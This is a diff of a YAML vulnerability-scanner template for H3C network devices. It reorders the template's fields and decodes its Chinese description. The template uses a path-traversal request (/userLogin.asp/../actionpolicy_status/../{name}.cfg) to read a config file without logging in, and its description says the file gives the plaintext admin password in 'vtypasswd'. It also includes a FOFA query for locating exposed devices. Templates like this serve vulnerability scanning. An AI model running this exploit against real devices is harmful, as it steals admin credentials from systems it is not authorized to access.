@@ -1,24 +1,27 @@
-expression: r0() && r1()
 id: h3c-information-leakage
+
 info:
+  name: H3C设备敏感信息泄露
   author: ifofor
-  description: "\u672A\u6388\u6743\u8BFB\u53D6\u5BC6\u7801\u6587\u4EF6\uFF0C\u53EF\
-    \u83B7\u53D6\u660E\u6587\u5BC6\u7801\uFF08\u7528\u6237\u540Dadmin\uFF0C\u5BC6\u7801\
-    \uFF1A\u7B2C\u4E8C\u4E2A\u6570\u636E\u5305vtypasswd\u7684\u503C\uFF09\nFofa\uFF1A\
-    \"userLogin.asp\" && server=\"H3C-Miniware-Webs\"\n"
-  name: "H3C\u8BBE\u5907\u654F\u611F\u4FE1\u606F\u6CC4\u9732"
   severity: high
+  description: |-
+    未授权读取密码文件，可获取明文密码（用户名admin，密码：第二个数据包vtypasswd的值）
+    fofa: "userLogin.asp" && server="H3C-Miniware-Webs"
+  tags: h3c,information-leakage
+  created: 2023/07/25
+
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'H3C Corporation')
-    output:
-      name: search["title2"]
-      search: '"(?P<title2>(?<=<title>)[A-Z^](.+)[0-9A-Z])".bsubmatch(response.body)'
     request:
       method: GET
       path: /userLogin.asp
+    expression: response.status == 200 && response.body.bcontains(b'H3C Corporation')
+    output:
+      search: '"(?P<title2>(?<=<title>)[A-Z^](.+)[0-9A-Z])".bsubmatch(response.body)'
+      name: search["title2"]
   r1:
-    expression: response.status == 200 && response.body.bcontains(b'vtypasswd=')
     request:
       method: GET
       path: /userLogin.asp/../actionpolicy_status/../{{name}}.cfg
+    expression: response.status == 200 && response.body.bcontains(b'vtypasswd=')
+expression: r0() && r1()
